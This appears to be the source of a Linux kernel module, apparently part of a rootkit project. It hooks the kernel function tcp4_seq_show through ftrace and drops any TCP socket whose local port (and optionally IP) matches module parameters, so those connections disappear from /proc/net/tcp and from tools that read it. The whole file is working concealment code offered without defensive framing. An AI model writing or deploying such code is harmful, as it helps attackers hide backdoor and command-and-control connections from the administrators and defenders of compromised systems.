#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <net/inet_sock.h>
#include <net/inet_timewait_sock.h>
#include "../common/stringify/to_string.h"
#include "../common/ftrace_hooking/ftrace_hook.h"

// Types & other consts.
static char *ip_to_hide = NULL;
module_param(ip_to_hide, charp, 0600);

static int port_to_hide = -1;
module_param(port_to_hide, int, 0600);

typedef int (*original_tcp4_seq_show_t)(struct seq_file *seq, void *v);
static struct fthook hook;

struct sock_info {
    __be32 ipaddr;
    __u16 port;
};

struct sock_info get_sock_info(struct sock *sk) {
    struct sock_info sk_info;

    switch (sk->sk_state) {
        case TCP_TIME_WAIT: {
            struct inet_timewait_sock *tw = (struct inet_timewait_sock*)sk;
            sk_info.ipaddr = tw->tw_rcv_saddr;
            sk_info.port = ntohs(tw->tw_sport);
            break;
        }
        default: {
            struct inet_sock *inet = inet_sk(sk);
            sk_info.ipaddr = inet->inet_saddr;
            sk_info.port = ntohs(inet->inet_sport);
            break;
        }
    }

    return sk_info;
}

int new_tcp4_seq_show(struct seq_file *seq, void *v) {
    original_tcp4_seq_show_t original_tcp4_seq_ptr = (original_tcp4_seq_show_t)hook.original_function_address;

    if (v == SEQ_START_TOKEN) {
        return original_tcp4_seq_ptr(seq, v);    
    }

    struct sock *sk = v;
    struct sock_info sk_info = get_sock_info(sk);
    
    char *ipstring = kmalloc(IP_STRING_MAX_LEN, GFP_KERNEL);
    ipaddr_to_string(sk_info.ipaddr, ipstring);
    if (((ip_to_hide == NULL) && (sk_info.port == port_to_hide)) || ((ip_to_hide != NULL) && !strcmp(ipstring, ip_to_hide) && (sk_info.port == port_to_hide))) {
        pr_info("Hiding %s : %u", ipstring, sk_info.port);
        kfree(ipstring);
        return 0;
    }

    kfree(ipstring);
    return original_tcp4_seq_ptr(seq, v);
}
 
int load(void) {
    pr_info("Initializing...");
    if (port_to_hide == -1) {
        pr_warn("port to hide has not been set! Exiting...");
        return -EINVAL;
    }
    pr_info("%s:%d", ip_to_hide, port_to_hide);

    int res = setup_kernel_func_hook(&hook, "tcp4_seq_show", (unsigned long)new_tcp4_seq_show);
    if (res) {
        return res;
    }

    pr_info("Initialized successfuly!");

    return 0;
}
 
void unload(void) {
    pr_info("Shutting down.");
    remove_hook(&hook);
    pr_info("Goodbye world...");
}

module_init(load);
module_exit(unload);

MODULE_LICENSE("GPL");